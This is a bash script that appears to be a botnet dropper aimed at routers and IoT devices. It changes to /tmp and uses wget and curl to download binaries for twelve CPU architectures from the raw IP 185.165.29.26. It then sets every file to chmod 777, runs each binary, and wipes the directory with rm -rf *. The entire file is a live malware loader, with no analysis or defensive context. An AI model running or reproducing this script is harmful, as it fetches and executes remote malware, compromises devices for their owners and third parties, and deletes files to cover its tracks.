#!/bin/bash

cd /tmp
wget http://185.165.29.26/prefixmips
wget http://185.165.29.26/prefixmipsel
wget http://185.165.29.26/prefixarm4
wget http://185.165.29.26/prefixarm5
wget http://185.165.29.26/prefixsh4
wget http://185.165.29.26/prefixppc
wget http://185.165.29.26/prefixi686
wget http://185.165.29.26/prefixsparc
wget http://185.165.29.26/prefixi586
wget http://185.165.29.26/prefix86_64
wget http://185.165.29.26/prefixarmv61
wget http://185.165.29.26/prefixm68

curl http://185.165.29.26/prefixi686 -o prefixi686
curl http://185.165.29.26/prefixsparc -o prefixsparc
curl http://185.165.29.26/prefixi586 -o prefixi586
curl http://185.165.29.26/prefix86_64 -o prefix86_64
curl http://185.165.29.26/prefixarmv61 -o prefixarmv61
curl http://185.165.29.26/prefixm68 -o prefixm68
curl http://185.165.29.26/prefixmips -o prefixmips
curl http://185.165.29.26/prefixmipsel -o prefixmipsel
curl http://185.165.29.26/prefixarm4 -o prefixarm4
curl http://185.165.29.26/prefixarm5 -o prefixarm5
curl http://185.165.29.26/prefixsh4 -o prefixsh4
curl http://185.165.29.26/prefixppc -o prefixppc


chmod 777 *

./prefixarmv61
./prefixsparc
./prefixm68
./prefixmips
./prefixmipsel
./prefixarm4
./prefixarm5
./prefixsh4
./prefixppc
./prefixi686
./prefixi586
./prefix86_64
sleep 3 
rm -rf *
